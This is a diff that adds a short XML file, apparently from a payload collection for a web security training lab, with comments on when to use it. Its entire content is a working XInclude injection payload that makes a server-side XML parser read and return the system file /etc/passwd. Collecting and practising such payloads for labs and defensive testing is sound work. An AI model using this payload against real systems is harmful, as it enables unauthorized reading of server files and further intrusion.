@@ -1,0 +1,6 @@
+<!-- XInclude Attack - No DOCTYPE control needed -->
+<!-- Use: When input is embedded in server-side XML -->
+<!-- Target Lab: Exploiting XInclude to retrieve files -->
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include parse="text" href="file:///etc/passwd"/>
+</foo>
